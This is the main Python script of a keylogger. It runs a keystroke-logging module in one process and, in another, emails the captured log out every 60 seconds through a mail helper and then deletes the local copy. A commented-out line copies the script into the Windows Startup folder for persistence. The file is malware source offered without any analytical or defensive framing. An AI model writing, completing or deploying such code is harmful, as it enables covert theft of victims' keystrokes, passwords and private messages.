
import multiprocessing
import sys
from shutil import copyfile
import os


username = os.getlogin()
# copyfile('main.py', f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.py")

def keylogger():
    import logger

def send_email():
    import mail_3
    import time
    while True:
        import handling_log
        time.sleep(60)
        print('tentando enviar email')
        try:
            mail_3.sendmail()
            handling_log.clear_data()
        except:
            continue
    
if __name__ == '__main__':
    import time
    p1 = multiprocessing.Process(target=keylogger)
    p1.start()
    p2 = multiprocessing.Process(target=send_email)
    p2.start()
    p1.join()
    p2.join()

